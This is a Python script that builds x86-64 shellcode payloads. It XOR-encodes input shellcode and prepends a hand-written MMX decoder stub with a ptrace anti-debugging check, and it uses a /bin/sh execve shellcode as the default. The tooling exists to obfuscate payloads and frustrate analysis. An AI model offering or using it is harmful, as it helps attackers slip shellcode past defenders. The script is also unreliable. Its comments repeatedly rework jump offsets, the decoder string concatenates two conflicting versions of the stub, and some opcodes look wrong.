#!/usr/bin/python3
import datetime
import random
import struct

def generate_mmx_payload(hex_input, description):
    # 1. Data preparation
    try:
        shellcode = bytearray.fromhex(hex_input)
    except ValueError:
        return "Error: Invalid HEX format."

    # Align shellcode to 8 bytes (64-bit) for MMX operations
    remainder = len(shellcode) % 8
    if remainder != 0:
        padding = 8 - remainder
        shellcode.extend(b'\x90' * padding)  # Pad with NOPs

    # 2. Generate random 8-byte key
    key_int = random.getrandbits(64)
    key_bytes = key_int.to_bytes(8, byteorder='little')
    key_hex = key_bytes.hex()

    # 3. MMX XOR encryption (8 bytes at a time)
    encoded = bytearray()
    for i in range(0, len(shellcode), 8):
        chunk = shellcode[i:i+8]
        chunk_int = int.from_bytes(chunk, byteorder='little')
        encoded_int = chunk_int ^ key_int
        encoded.extend(encoded_int.to_bytes(8, byteorder='little'))

    # 4. Generate MMX Decoder Stub with Anti-Debug
    #
    # Assembly Logic:
    #   ; --- Anti-Debug (PTRACE_TRACEME) ---
    #   xor rdi, rdi          ; 0
    #   xor rsi, rsi          ; 0
    #   xor rdx, rdx          ; 0
    #   xor r10, r10          ; 0
    #   push 101
    #   pop rax               ; sys_ptrace
    #   syscall
    #   test rax, rax
    #   js exit_detected      ; If < 0, debugger detected -> Exit
    #
    #   ; --- MMX Decoder ---
    #   jmp get_address       ; Jump to call-pop to get IP
    # decoder_loop:
    #   pop rsi               ; RSI points to Encoded Shellcode
    #   mov rcx, len_blocks   ; Number of 8-byte blocks
    #   mov rbx, key          ; Load Key
    #   movq mm0, rbx         ; Move Key to MMX0
    # decrypt:
    #   movq mm1, [rsi]       ; Load Encoded Chunk
    #   pxor mm1, mm0         ; XOR with Key
    #   movq [rsi], mm1       ; Store Decoded Chunk
    #   add rsi, 8            ; Next Chunk
    #   loop decrypt          ; Loop
    #   jmp shellcode_start   ; Jump to decoded code
    # exit_detected:
    #   push 60
    #   pop rax
    #   syscall
    # get_address:
    #   call decoder_loop
    #   ... data ...

    # Simplified relative addressing approach without JMP-CALL-POP if possible, 
    # but JMP-CALL-POP is standard for position-independent shellcode.
    
    num_blocks = len(shellcode) // 8
    
    # Opcode construction
    antidebug = (
        "4831ff"        # xor rdi, rdi
        "4831f6"        # xor rsi, rsi
        "4831d2"        # xor rdx, rdx
        "4d31d2"        # xor r10, r10
        "6a65"          # push 101
        "58"            # pop rax
        "0f05"          # syscall
        "4885c0"        # test rax, rax
        "780b"          # js exit_process (+11 bytes) -> jumps to 'push 60...'
    )

    # To calculate offsets correctly, let's assemble the stub mentally or use a fixed template
    # Since we need to embed the 8-byte key and the loop count, it's easier to use a relative LEA if we know the offset,
    # or the classic CALL trick.
    
    # Using the "Call-Pop" trick to get address of data
    
    key_part_lower = key_hex[8:] # little endian is reversed in variable assignment vs memory? 
    # Actually python's key_hex is just hex string. 
    # mov rbx, 0x1122334455667788 -> 48 bb 88 77 66 55 44 33 22 11
    
    # Reversing key bytes for 'mov rbx, imm64'
    key_reversed_hex = "".join(reversed([key_hex[i:i+2] for i in range(0, len(key_hex), 2)]))

    decoder = (
        # Start of successful check
        "eb1e"                  # jmp get_data_addr (jump forward to 'call')
        # pop_addr:
        "5e"                    # pop rsi (rsi = address of shellcode)
        "4831c9"                # xor rcx, rcx
        f"b1{hex(num_blocks)[2:].zfill(2)}" # mov cl, num_blocks (assuming < 256 blocks for small shellcode)
        f"48bb{key_reversed_hex}" # mov rbx, KEY
        "66480f6e03"            # movq mm0, rbx
        
        # loop_start:
        "0f6e0e"                # movq mm1, [rsi]
        "0fefc8"                # pxor mm1, mm0
        "0f7f0e"                # movq [rsi], mm1
        "4883c608"              # add rsi, 8
        "e2f3"                  # loop loop_start (short jump back)
        "eb05"                  # jmp to_shellcode (skip exit stub)
        
        # exit_process:
        "6a3c"                  # push 60
        "58"                    # pop rax
        "0f05"                  # syscall
        
        # get_data_addr:
        "e8ddffffff"            # call pop_addr (jump back)
        # data follows...
    )
    
    # NOTE: Calculated offsets in jumps (eb XX) might be slightly off without exact byte counting.
    # Let's count bytes for 'decoder' part to fix offsets.
    # 5e (1)
    # 48 31 c9 (3)
    # b1 XX (2)
    # 48 bb 8-bytes (10)
    # 66 48 0f 6e 03 (5) 
    # Total pre-loop: 1+3+2+10+5 = 21 bytes
    
    # Loop:
    # 0f 6e 0e (3)
    # 0f ef c8 (3)
    # 0f 7f 0e (3)
    # 48 83 c6 08 (4)
    # e2 f3 (2) -> f3 is -13. 3+3+3+4+2 = 15 bytes. Correct.
    
    # After loop:
    # eb 05 (2) -> Jumps over exit_process (5 bytes)
    
    # exit_process:
    # 6a 3c (2)
    # 58 (1)
    # 0f 05 (2) 
    # Total exit: 5 bytes.
    
    # get_data_addr:
    # Call is 5 bytes.
    # Jump to get_data_addr needs to skip: 21 (pre) + 15 (loop) + 2 (jmp) + 5 (exit) = 43 bytes.
    # eb 2b (43 is 0x2B)
    
    # The Anti-Debug part is at the very top.
    # js exit_process
    # We need to jump to the 'exit_process' label inside the decoder block? 
    # Or just replicate the exit call. Replicating is safer and simpler logic.
    
    full_stub = (
        # 1. Anti-Debug
        "4831ff" "4831f6" "4831d2" "4d31d2" "6a65" "58" "0f05" 
        "4885c0" 
        "782e"          # js exit_now (jump relative to end of this instruction). 
                        # We need to jump to the exit syscall at the end of the decoder or a local one.
                        # Let's verify size.
                        # Anti-debug headers size: 3+3+3+3+2+1+2+3+2 = 22 bytes.
                        # We want to jump to the `jmp get_data_addr` if SUCCESS.
                        # If FAIL, we fall through to... wait, 'js' jumps if SIGNED (negative).
                        # So if detected, we JUMP. If not detected (RAX >= 0), we continue.
                        # Actually 'ptrace' returns 0 on success.
                        # So 'js' takes us to EXIT.
                        # Fallthrough takes us to DECODER.
                        
        # Let's invert logic to match the linear flow better or just keep it.
        # Flow:
        # Check Ptrace
        # If Detected (RAX < 0) -> Jump to Exit
        # Else -> Continue to Decoder
        
        # Re-calc 'js' offset. 
        # Decoder starts immediately after 'js'.
        # We need to jump PAST the decoder start, to the exit code?
        # Or just perform exit right here?
        # If I put exit code at the end of the stub, 'js' can verify easily.
    )

    # Re-assembling the logic cleanly:
    
    # [Anti-Debug Check]
    # [Conditional Jump to Bad_End]
    # [JMP to Get_Address]
    # [Pop Address]
    # [Setup MMX/Loop]
    # [Decrypt Loop]
    # [JMP to Payload]
    # [Bad_End: Exit Syscall]
    # [Get_Address: Call Pop_Address]
    # [Encrypted Payload]
    
    # Let's implement this structure.
    
    # Block 1: Anti-Debug
    anti_debug_op = (
        "4831ff" "4831f6" "4831d2" "4d31d2" "6a65" "58" "0f05" "4885c0" 
        "7837" # js to Bad_End (offset TBD)
    )
    
    # Block 2: JMP to Get_Address
    jmp_to_call = "eb2b" # (offset TBD, matches previous calc 0x2B=43)
    
    # Block 3: Decoder Body
    decoder_body = (
        "5e"                    # pop rsi
        "4831c9"                # xor rcx, rcx
        f"b1{hex(num_blocks)[2:].zfill(2)}" # mov cl, N
        f"48bb{key_reversed_hex}" # mov rbx, KEY
        "66480f6e03"            # movq mm0, rbx
        
        # Loop
        "0f6e0e"                # movq mm1, [rsi]
        "0fefc8"                # pxor mm1, mm0
        "0f7f0e"                # movq [rsi], mm1
        "4883c608"              # add rsi, 8
        "e2f3"                  # loop -13
        
        # Jmp to Payload (which is right after this decoder stub + call/pop nonsense)
        # Actually, RSI points to current block. After loop, RSI points to end of payload.
        # But we decoding IN PLACE. So the payload starts at the address we popped into RSI earlier.
        # We need that address.
        # RSI incremented during loop.
        # Approach: Save RSI or subtract length.
        # Better: "push rsi" after pop, then "ret" or "jmp [rsp]"?
        # Simpler: 
        # pop rsi
        # push rsi (save start)
        # ... logic ...
        # ret (jumps to rsi)
        
        # Let's adjust Decoder Body:
        "5e"                    # pop rsi
        "56"                    # push rsi (Save Start Address)
        "4831c9"                # xor rcx, rcx
        f"b1{hex(num_blocks)[2:].zfill(2)}" # mov cl, N
        f"48bb{key_reversed_hex}" # mov rbx, KEY
        "66480f6e03"            # movq mm0, rbx
        
        # Loop
        "0f6e0e"                # movq mm1, [rsi]
        "0fefc8"                # pxor mm1, mm0
        "0f7f0e"                # movq [rsi], mm1
        "4883c608"              # add rsi, 8
        "e2f3"                  # loop
        
        "c3"                    # ret (Jump to popped RSI)
    )
    
    # Bytes count for Decoder Body V2:
    # 5e (1)
    # 56 (1)
    # 48 31 c9 (3)
    # b1 XX (2)
    # 48 bb ... (10)
    # 66 48 0f 6e 03 (5)
    # Loop (15)
    # c3 (1)
    # Total: 1+1+3+2+10+5+15+1 = 38 bytes.
    
    # Block 4: Bad_End
    bad_end = "6a3c580f05" # exit(60)
    
    # Block 5: Connectors
    # jmp_to_call needs to jump over Decoder Body + Bad_End
    # Size to jump = 38 (decoder) + 5 (bad_end) = 43 bytes (0x2B).
    jmp_to_call = "eb2b"
    
    # js in Anti-Debug needs to jump to Bad_End
    # It checks before jmp_to_call.
    # Layout:
    # [Anti-Debug] -> [js Bad_End]
    # [jmp_to_call]
    # [Decoder Body]
    # [Bad_End]
    # [Get_Address]
    
    # JS offset = Size(jmp_to_call) + Size(Decoder Body)
    # Offset = 2 + 38 = 40 (0x28).
    
    anti_debug_op = (
        "4831ff4831f64831d24d31d26a65580f054885c0" 
        "7828" # js +40 bytes
    )
    
    # Block 6: Get_Address
    # call (pointer back to 'pop rsi' at start of Decoder Body)
    # call offset = -(Decoder Body Size + Jmp_To_Call Size + Call Size itself?)
    # Call is relative to NEXT instruction.
    # Structure:
    # ...
    # [Bad_End]
    # Get_Address:
    # call (back to Decoder Body Start)
    # [Payload]
    
    # Distance back:
    # We are at Get_Address.
    # We want to land on 'pop rsi' (Start of Decoder Body).
    # Path: [Bad_End] (5) + [Decoder Body] (38) <- We want to be here.
    # Current IP is Get_Address + 5 (after call).
    # Jump back = - (5 (call) + 5 (bad_end) + 38 (decoder)) = -48 (0xD0 in two's complement byte? No, rel32 usually for call e8).
    # e8 <32-bit offset>
    # Offset = -48 = 0xFFFFFFD0
    
    get_address = "e8d0ffffff"
    
    final_stub = anti_debug_op + jmp_to_call + decoder_body + bad_end + get_address
    
    # 5. Polymorphic Junk (Optional, keeping simple for this specific request to ensure reliability first)
    # ...
    
    # 6. Logging
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = (
        f"--- {timestamp} ---\n"
        f"Description: {description} [MMX + Anti-Debug]\n"
        f"Encryption Type: MMX XOR (Key: 0x{key_hex})\n"
        f"Features: PTRACE_TRACEME Check, MMX Registers\n"
        f"Original: {hex_input}\n"
        f"Payload:  {final_stub + encoded.hex()}\n"
        f"Size: {len(final_stub)//2 + len(encoded)} bytes\n"
        f"{'-'*40}\n"
    )

    with open("XOR.txt", "a", encoding="utf-8") as f:
        f.write(log_entry)

    return final_stub + encoded.hex(), key_hex, timestamp

if __name__ == "__main__":
    print("--- XOR-MMX Shellcode Generator ---")
    print("Features: Anti-Debug (Ptrace) + MMX Obfuscation")
    my_hex = input("Enter Shellcode HEX: ").strip()
    if not my_hex:
        # Default /bin/sh execve for testing
        my_hex = "4831f65648bb2f62696e2f2f736853545f5657545e6a3b58990f05"
        print(f"Using default shellcode: {my_hex}")
        
    my_desc = input("Description: ").strip() or "Standard Payload"

    payload, key, time = generate_mmx_payload(my_hex, my_desc)

    print(f"\n[*] Generated Payload (Key: 0x{key})")
    print(f"[*] Saved to XOR.txt")
    print(f"[*] Payload:\n{payload}")
